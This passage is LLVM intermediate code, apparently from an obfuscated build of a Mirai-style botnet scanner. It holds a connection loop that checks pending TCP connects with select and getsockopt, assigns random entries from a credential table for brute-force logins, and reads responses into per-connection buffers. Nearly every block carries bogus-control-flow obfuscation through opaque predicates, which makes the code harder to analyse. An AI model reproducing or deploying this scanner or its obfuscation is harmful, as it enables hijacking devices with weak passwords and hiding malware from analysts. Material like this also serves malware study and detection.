originalBBpart2122:                               ; preds = %originalBB113
  br label %567

; <label>:620:                                    ; preds = %594, %567
  %621 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %622 = icmp eq %struct.scanner_connection* %621, null
  br i1 %622, label %623, label %624

; <label>:623:                                    ; preds = %620
  br label %636

; <label>:624:                                    ; preds = %620
  %625 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %626 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %625, i32 0, i32 8
  %627 = load i32, i32* %626, align 4
  %628 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %629 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %628, i32 0, i32 4
  store i32 %627, i32* %629, align 4
  %630 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %631 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %630, i32 0, i32 0
  %632 = load i16, i16* %631, align 4
  %633 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %634 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %633, i32 0, i32 5
  store i16 %632, i16* %634, align 8
  %635 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %635)
  br label %307

; <label>:636:                                    ; preds = %623, %originalBBpart228
  br label %637

; <label>:637:                                    ; preds = %636
  %638 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %639 = getelementptr inbounds [16 x i64], [16 x i64]* %638, i64 0, i64 0
  %640 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %639) #6, !srcloc !1
  %641 = extractvalue { i64, i64* } %640, 0
  %642 = extractvalue { i64, i64* } %640, 1
  %643 = trunc i64 %641 to i32
  store i32 %643, i32* %24, align 4
  %644 = ptrtoint i64* %642 to i64
  %645 = trunc i64 %644 to i32
  store i32 %645, i32* %25, align 4
  br label %646

; <label>:646:                                    ; preds = %637
  br label %647

; <label>:647:                                    ; preds = %646
  %648 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %649 = getelementptr inbounds [16 x i64], [16 x i64]* %648, i64 0, i64 0
  %650 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %649) #6, !srcloc !2
  %651 = extractvalue { i64, i64* } %650, 0
  %652 = extractvalue { i64, i64* } %650, 1
  %653 = trunc i64 %651 to i32
  store i32 %653, i32* %26, align 4
  %654 = ptrtoint i64* %652 to i64
  %655 = trunc i64 %654 to i32
  store i32 %655, i32* %27, align 4
  br label %656

; <label>:656:                                    ; preds = %647
  store i32 0, i32* %1, align 4
  br label %657

; <label>:657:                                    ; preds = %890, %656
  %658 = load i32, i32* %1, align 4
  %659 = icmp slt i32 %658, 256
  br i1 %659, label %660, label %893

; <label>:660:                                    ; preds = %657
  %661 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %662 = load i32, i32* %1, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %661, i64 %663
  store %struct.scanner_connection* %664, %struct.scanner_connection** %7, align 8
  %665 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %666 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %665, i32 0, i32 3
  %667 = load i32, i32* %666, align 8
  %668 = icmp ugt i32 %667, 1
  %669 = select i1 %668, i32 30, i32 5
  store i32 %669, i32* %28, align 4
  %670 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %671 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %670, i32 0, i32 3
  %672 = load i32, i32* %671, align 8
  %673 = icmp ne i32 %672, 0
  br i1 %673, label %674, label %746

; <label>:674:                                    ; preds = %660
  %675 = load i32, i32* @x.53
  %676 = load i32, i32* @y.54
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %674
  %683 = load i32, i32* @fake_time, align 4
  %684 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %685 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %684, i32 0, i32 2
  %686 = load i32, i32* %685, align 4
  %687 = sub i32 %683, %686
  %688 = load i32, i32* %28, align 4
  %689 = icmp ugt i32 %687, %688
  %690 = load i32, i32* @x.53
  %691 = load i32, i32* @y.54
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart2133, label %originalBB124alteredBB

originalBBpart2133:                               ; preds = %originalBB124
  br i1 %689, label %698, label %746

; <label>:698:                                    ; preds = %originalBBpart2133
  %699 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %700 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %699, i32 0, i32 1
  %701 = load i32, i32* %700, align 8
  %702 = call i32 @close(i32 %701)
  %703 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %704 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %703, i32 0, i32 1
  store i32 -1, i32* %704, align 8
  %705 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %706 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %705, i32 0, i32 3
  %707 = load i32, i32* %706, align 8
  %708 = icmp ugt i32 %707, 2
  br i1 %708, label %709, label %740

; <label>:709:                                    ; preds = %698
  %710 = load i32, i32* @x.53
  %711 = load i32, i32* @y.54
  %712 = sub i32 %710, 1
  %713 = mul i32 %710, %712
  %714 = urem i32 %713, 2
  %715 = icmp eq i32 %714, 0
  %716 = icmp slt i32 %711, 10
  %717 = or i1 %715, %716
  br i1 %717, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %709
  %718 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %719 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %718, i32 0, i32 8
  %720 = load i8, i8* %719, align 8
  %721 = add i8 %720, 1
  store i8 %721, i8* %719, align 8
  %722 = zext i8 %721 to i32
  %723 = icmp eq i32 %722, 10
  %724 = load i32, i32* @x.53
  %725 = load i32, i32* @y.54
  %726 = sub i32 %724, 1
  %727 = mul i32 %724, %726
  %728 = urem i32 %727, 2
  %729 = icmp eq i32 %728, 0
  %730 = icmp slt i32 %725, 10
  %731 = or i1 %729, %730
  br i1 %731, label %originalBBpart2148, label %originalBB135alteredBB

originalBBpart2148:                               ; preds = %originalBB135
  br i1 %723, label %732, label %737

; <label>:732:                                    ; preds = %originalBBpart2148
  %733 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %734 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %733, i32 0, i32 8
  store i8 0, i8* %734, align 8
  %735 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %736 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %735, i32 0, i32 3
  store i32 0, i32* %736, align 8
  br label %739

; <label>:737:                                    ; preds = %originalBBpart2148
  %738 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %738)
  br label %739

; <label>:739:                                    ; preds = %737, %732
  br label %745

; <label>:740:                                    ; preds = %698
  %741 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %742 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %741, i32 0, i32 8
  store i8 0, i8* %742, align 8
  %743 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %744 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %743, i32 0, i32 3
  store i32 0, i32* %744, align 8
  br label %745

; <label>:745:                                    ; preds = %740, %739
  br label %890

; <label>:746:                                    ; preds = %originalBBpart2133, %660
  %747 = load i32, i32* @x.53
  %748 = load i32, i32* @y.54
  %749 = sub i32 %747, 1
  %750 = mul i32 %747, %749
  %751 = urem i32 %750, 2
  %752 = icmp eq i32 %751, 0
  %753 = icmp slt i32 %748, 10
  %754 = or i1 %752, %753
  br i1 %754, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %746
  %755 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %756 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %755, i32 0, i32 3
  %757 = load i32, i32* %756, align 8
  %758 = icmp eq i32 %757, 1
  %759 = load i32, i32* @x.53
  %760 = load i32, i32* @y.54
  %761 = sub i32 %759, 1
  %762 = mul i32 %759, %761
  %763 = urem i32 %762, 2
  %764 = icmp eq i32 %763, 0
  %765 = icmp slt i32 %760, 10
  %766 = or i1 %764, %765
  br i1 %766, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br i1 %758, label %767, label %809

; <label>:767:                                    ; preds = %originalBBpart2152
  %768 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %769 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %768, i32 0, i32 1
  %770 = load i32, i32* %769, align 8
  %771 = srem i32 %770, 64
  %772 = zext i32 %771 to i64
  %773 = shl i64 1, %772
  %774 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %775 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %776 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %775, i32 0, i32 1
  %777 = load i32, i32* %776, align 8
  %778 = sdiv i32 %777, 64
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds [16 x i64], [16 x i64]* %774, i64 0, i64 %779
  %781 = load i64, i64* %780, align 8
  %782 = or i64 %781, %773
  store i64 %782, i64* %780, align 8
  %783 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %784 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %783, i32 0, i32 1
  %785 = load i32, i32* %784, align 8
  %786 = load i32, i32* %12, align 4
  %787 = icmp sgt i32 %785, %786
  br i1 %787, label %788, label %808

; <label>:788:                                    ; preds = %767
  %789 = load i32, i32* @x.53
  %790 = load i32, i32* @y.54
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %788
  %797 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %798 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %797, i32 0, i32 1
  %799 = load i32, i32* %798, align 8
  store i32 %799, i32* %12, align 4
  %800 = load i32, i32* @x.53
  %801 = load i32, i32* @y.54
  %802 = sub i32 %800, 1
  %803 = mul i32 %800, %802
  %804 = urem i32 %803, 2
  %805 = icmp eq i32 %804, 0
  %806 = icmp slt i32 %801, 10
  %807 = or i1 %805, %806
  br i1 %807, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %808

; <label>:808:                                    ; preds = %originalBBpart2156, %767
  br label %873

; <label>:809:                                    ; preds = %originalBBpart2152
  %810 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %811 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %810, i32 0, i32 3
  %812 = load i32, i32* %811, align 8
  %813 = icmp ne i32 %812, 0
  br i1 %813, label %814, label %872

; <label>:814:                                    ; preds = %809
  %815 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %816 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %815, i32 0, i32 1
  %817 = load i32, i32* %816, align 8
  %818 = srem i32 %817, 64
  %819 = zext i32 %818 to i64
  %820 = shl i64 1, %819
  %821 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %822 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %823 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %822, i32 0, i32 1
  %824 = load i32, i32* %823, align 8
  %825 = sdiv i32 %824, 64
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds [16 x i64], [16 x i64]* %821, i64 0, i64 %826
  %828 = load i64, i64* %827, align 8
  %829 = or i64 %828, %820
  store i64 %829, i64* %827, align 8
  %830 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %831 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %830, i32 0, i32 1
  %832 = load i32, i32* %831, align 8
  %833 = load i32, i32* %11, align 4
  %834 = icmp sgt i32 %832, %833
  br i1 %834, label %835, label %855

; <label>:835:                                    ; preds = %814
  %836 = load i32, i32* @x.53
  %837 = load i32, i32* @y.54
  %838 = sub i32 %836, 1
  %839 = mul i32 %836, %838
  %840 = urem i32 %839, 2
  %841 = icmp eq i32 %840, 0
  %842 = icmp slt i32 %837, 10
  %843 = or i1 %841, %842
  br i1 %843, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %835
  %844 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %845 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %844, i32 0, i32 1
  %846 = load i32, i32* %845, align 8
  store i32 %846, i32* %11, align 4
  %847 = load i32, i32* @x.53
  %848 = load i32, i32* @y.54
  %849 = sub i32 %847, 1
  %850 = mul i32 %847, %849
  %851 = urem i32 %850, 2
  %852 = icmp eq i32 %851, 0
  %853 = icmp slt i32 %848, 10
  %854 = or i1 %852, %853
  br i1 %854, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %855

; <label>:855:                                    ; preds = %originalBBpart2160, %814
  %856 = load i32, i32* @x.53
  %857 = load i32, i32* @y.54
  %858 = sub i32 %856, 1
  %859 = mul i32 %856, %858
  %860 = urem i32 %859, 2
  %861 = icmp eq i32 %860, 0
  %862 = icmp slt i32 %857, 10
  %863 = or i1 %861, %862
  br i1 %863, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %855
  %864 = load i32, i32* @x.53
  %865 = load i32, i32* @y.54
  %866 = sub i32 %864, 1
  %867 = mul i32 %864, %866
  %868 = urem i32 %867, 2
  %869 = icmp eq i32 %868, 0
  %870 = icmp slt i32 %865, 10
  %871 = or i1 %869, %870
  br i1 %871, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %872

; <label>:872:                                    ; preds = %originalBBpart2164, %809
  br label %873

; <label>:873:                                    ; preds = %872, %808
  %874 = load i32, i32* @x.53
  %875 = load i32, i32* @y.54
  %876 = sub i32 %874, 1
  %877 = mul i32 %874, %876
  %878 = urem i32 %877, 2
  %879 = icmp eq i32 %878, 0
  %880 = icmp slt i32 %875, 10
  %881 = or i1 %879, %880
  br i1 %881, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %873
  %882 = load i32, i32* @x.53
  %883 = load i32, i32* @y.54
  %884 = sub i32 %882, 1
  %885 = mul i32 %882, %884
  %886 = urem i32 %885, 2
  %887 = icmp eq i32 %886, 0
  %888 = icmp slt i32 %883, 10
  %889 = or i1 %887, %888
  br i1 %889, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %890

; <label>:890:                                    ; preds = %originalBBpart2168, %745
  %891 = load i32, i32* %1, align 4
  %892 = add nsw i32 %891, 1
  store i32 %892, i32* %1, align 4
  br label %657

; <label>:893:                                    ; preds = %657
  %894 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 1
  store i64 0, i64* %894, align 8
  %895 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %8, i32 0, i32 0
  store i64 1, i64* %895, align 8
  %896 = load i32, i32* %12, align 4
  %897 = load i32, i32* %11, align 4
  %898 = icmp sgt i32 %896, %897
  br i1 %898, label %899, label %901

; <label>:899:                                    ; preds = %893
  %900 = load i32, i32* %12, align 4
  br label %903

; <label>:901:                                    ; preds = %893
  %902 = load i32, i32* %11, align 4
  br label %903

; <label>:903:                                    ; preds = %901, %899
  %904 = phi i32 [ %900, %899 ], [ %902, %901 ]
  %905 = add nsw i32 1, %904
  %906 = call i32 @select(i32 %905, %struct.fd_set.26* %5, %struct.fd_set.26* %6, %struct.fd_set.26* null, %struct.timeval.27* %8)
  store i32 %906, i32* %13, align 4
  %907 = call i64 @time(i64* null) #6
  %908 = trunc i64 %907 to i32
  store i32 %908, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %909

; <label>:909:                                    ; preds = %originalBBpart2263, %903
  %910 = load i32, i32* %1, align 4
  %911 = icmp slt i32 %910, 256
  br i1 %911, label %912, label %1651

; <label>:912:                                    ; preds = %909
  %913 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %914 = load i32, i32* %1, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %913, i64 %915
  store %struct.scanner_connection* %916, %struct.scanner_connection** %7, align 8
  %917 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %918 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %917, i32 0, i32 1
  %919 = load i32, i32* %918, align 8
  %920 = icmp eq i32 %919, -1
  br i1 %920, label %921, label %922

; <label>:921:                                    ; preds = %912
  br label %1632

; <label>:922:                                    ; preds = %912
  %923 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %6, i32 0, i32 0
  %924 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %925 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %924, i32 0, i32 1
  %926 = load i32, i32* %925, align 8
  %927 = sdiv i32 %926, 64
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds [16 x i64], [16 x i64]* %923, i64 0, i64 %928
  %930 = load i64, i64* %929, align 8
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %932 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %931, i32 0, i32 1
  %933 = load i32, i32* %932, align 8
  %934 = srem i32 %933, 64
  %935 = zext i32 %934 to i64
  %936 = shl i64 1, %935
  %937 = and i64 %930, %936
  %938 = icmp ne i64 %937, 0
  br i1 %938, label %939, label %1002

; <label>:939:                                    ; preds = %922
  %940 = load i32, i32* @x.53
  %941 = load i32, i32* @y.54
  %942 = sub i32 %940, 1
  %943 = mul i32 %940, %942
  %944 = urem i32 %943, 2
  %945 = icmp eq i32 %944, 0
  %946 = icmp slt i32 %941, 10
  %947 = or i1 %945, %946
  br i1 %947, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %939
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %948 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %949 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %948, i32 0, i32 1
  %950 = load i32, i32* %949, align 8
  %951 = bitcast i32* %29 to i8*
  %952 = call i32 @getsockopt(i32 %950, i32 1, i32 4, i8* %951, i32* %31) #6
  store i32 %952, i32* %30, align 4
  %953 = load i32, i32* %29, align 4
  %954 = icmp eq i32 %953, 0
  %955 = load i32, i32* @x.53
  %956 = load i32, i32* @y.54
  %957 = sub i32 %955, 1
  %958 = mul i32 %955, %957
  %959 = urem i32 %958, 2
  %960 = icmp eq i32 %959, 0
  %961 = icmp slt i32 %956, 10
  %962 = or i1 %960, %961
  br i1 %962, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br i1 %954, label %963, label %974

; <label>:963:                                    ; preds = %originalBBpart2172
  %964 = load i32, i32* %30, align 4
  %965 = icmp eq i32 %964, 0
  br i1 %965, label %966, label %974

; <label>:966:                                    ; preds = %963
  %967 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %968 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %967, i32 0, i32 3
  store i32 2, i32* %968, align 8
  %969 = call %struct.scanner_auth* @random_auth_entry()
  %970 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %971 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %970, i32 0, i32 0
  store %struct.scanner_auth* %969, %struct.scanner_auth** %971, align 8
  %972 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %973 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %972, i32 0, i32 6
  store i32 0, i32* %973, align 4
  br label %1001

; <label>:974:                                    ; preds = %963, %originalBBpart2172
  %975 = load i32, i32* @x.53
  %976 = load i32, i32* @y.54
  %977 = sub i32 %975, 1
  %978 = mul i32 %975, %977
  %979 = urem i32 %978, 2
  %980 = icmp eq i32 %979, 0
  %981 = icmp slt i32 %976, 10
  %982 = or i1 %980, %981
  br i1 %982, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %974
  %983 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %984 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %983, i32 0, i32 1
  %985 = load i32, i32* %984, align 8
  %986 = call i32 @close(i32 %985)
  %987 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %988 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %987, i32 0, i32 1
  store i32 -1, i32* %988, align 8
  %989 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %990 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %989, i32 0, i32 8
  store i8 0, i8* %990, align 8
  %991 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %992 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %991, i32 0, i32 3
  store i32 0, i32* %992, align 8
  %993 = load i32, i32* @x.53
  %994 = load i32, i32* @y.54
  %995 = sub i32 %993, 1
  %996 = mul i32 %993, %995
  %997 = urem i32 %996, 2
  %998 = icmp eq i32 %997, 0
  %999 = icmp slt i32 %994, 10
  %1000 = or i1 %998, %999
  br i1 %1000, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1632

; <label>:1001:                                   ; preds = %966
  br label %1002

; <label>:1002:                                   ; preds = %1001, %922
  %1003 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %5, i32 0, i32 0
  %1004 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1005 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1004, i32 0, i32 1
  %1006 = load i32, i32* %1005, align 8
  %1007 = sdiv i32 %1006, 64
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds [16 x i64], [16 x i64]* %1003, i64 0, i64 %1008
  %1010 = load i64, i64* %1009, align 8
  %1011 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1012 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1011, i32 0, i32 1
  %1013 = load i32, i32* %1012, align 8
  %1014 = srem i32 %1013, 64
  %1015 = zext i32 %1014 to i64
  %1016 = shl i64 1, %1015
  %1017 = and i64 %1010, %1016
  %1018 = icmp ne i64 %1017, 0
  br i1 %1018, label %1019, label %1631

; <label>:1019:                                   ; preds = %1002
  %1020 = load i32, i32* @x.53
  %1021 = load i32, i32* @y.54
  %1022 = sub i32 %1020, 1
  %1023 = mul i32 %1020, %1022
  %1024 = urem i32 %1023, 2
  %1025 = icmp eq i32 %1024, 0
  %1026 = icmp slt i32 %1021, 10
  %1027 = or i1 %1025, %1026
  br i1 %1027, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1019
  %1028 = load i32, i32* @x.53
  %1029 = load i32, i32* @y.54
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1036

; <label>:1036:                                   ; preds = %1629, %originalBBpart2180
  %1037 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1038 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1037, i32 0, i32 3
  %1039 = load i32, i32* %1038, align 8
  %1040 = icmp eq i32 %1039, 0
  br i1 %1040, label %1041, label %1042

; <label>:1041:                                   ; preds = %1036
  br label %1630

; <label>:1042:                                   ; preds = %1036
  %1043 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1044 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1043, i32 0, i32 6
  %1045 = load i32, i32* %1044, align 4
  %1046 = icmp eq i32 %1045, 256
  br i1 %1046, label %1047, label %1075

; <label>:1047:                                   ; preds = %1042
  %1048 = load i32, i32* @x.53
  %1049 = load i32, i32* @y.54
  %1050 = sub i32 %1048, 1
  %1051 = mul i32 %1048, %1050
  %1052 = urem i32 %1051, 2
  %1053 = icmp eq i32 %1052, 0
  %1054 = icmp slt i32 %1049, 10
  %1055 = or i1 %1053, %1054
  br i1 %1055, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1047
  %1056 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1057 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1056, i32 0, i32 7
  %1058 = getelementptr inbounds [256 x i8], [256 x i8]* %1057, i32 0, i32 0
  %1059 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1060 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1059, i32 0, i32 7
  %1061 = getelementptr inbounds [256 x i8], [256 x i8]* %1060, i32 0, i32 0
  %1062 = getelementptr inbounds i8, i8* %1061, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1058, i8* %1062, i64 192, i32 1, i1 false)
  %1063 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1064 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1063, i32 0, i32 6
  %1065 = load i32, i32* %1064, align 4
  %1066 = sub nsw i32 %1065, 64
  store i32 %1066, i32* %1064, align 4
  %1067 = load i32, i32* @x.53
  %1068 = load i32, i32* @y.54
  %1069 = sub i32 %1067, 1
  %1070 = mul i32 %1067, %1069
  %1071 = urem i32 %1070, 2
  %1072 = icmp eq i32 %1071, 0
  %1073 = icmp slt i32 %1068, 10
  %1074 = or i1 %1072, %1073
  br i1 %1074, label %originalBBpart2190, label %originalBB182alteredBB

originalBBpart2190:                               ; preds = %originalBB182
  br label %1075

; <label>:1075:                                   ; preds = %originalBBpart2190, %1042
  %1076 = call i32* @__errno_location() #7
  store i32 0, i32* %1076, align 4
  %1077 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1078 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1077, i32 0, i32 1
  %1079 = load i32, i32* %1078, align 8
  %1080 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1081 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1080, i32 0, i32 7
  %1082 = getelementptr inbounds [256 x i8], [256 x i8]* %1081, i32 0, i32 0
  %1083 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1084 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1083, i32 0, i32 6
  %1085 = load i32, i32* %1084, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds i8, i8* %1082, i64 %1086
  %1088 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1089 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1088, i32 0, i32 6
  %1090 = load i32, i32* %1089, align 4
  %1091 = sub nsw i32 256, %1090
  %1092 = call i32 @recv_strip_null(i32 %1079, i8* %1087, i32 %1091, i32 16384)
  store i32 %1092, i32* %32, align 4
  %1093 = load i32, i32* %32, align 4
  %1094 = icmp eq i32 %1093, 0
  br i1 %1094, label %1095, label %1097

; <label>:1095:                                   ; preds = %1075
  %1096 = call i32* @__errno_location() #7
  store i32 104, i32* %1096, align 4
  store i32 -1, i32* %32, align 4
  br label %1097

; <label>:1097:                                   ; preds = %1095, %1075
  %1098 = load i32, i32* @x.53
  %1099 = load i32, i32* @y.54
  %1100 = sub i32 %1098, 1
  %1101 = mul i32 %1098, %1100
  %1102 = urem i32 %1101, 2
  %1103 = icmp eq i32 %1102, 0
  %1104 = icmp slt i32 %1099, 10
  %1105 = or i1 %1103, %1104
  br i1 %1105, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %1097
  %1106 = load i32, i32* %32, align 4
  %1107 = icmp eq i32 %1106, -1
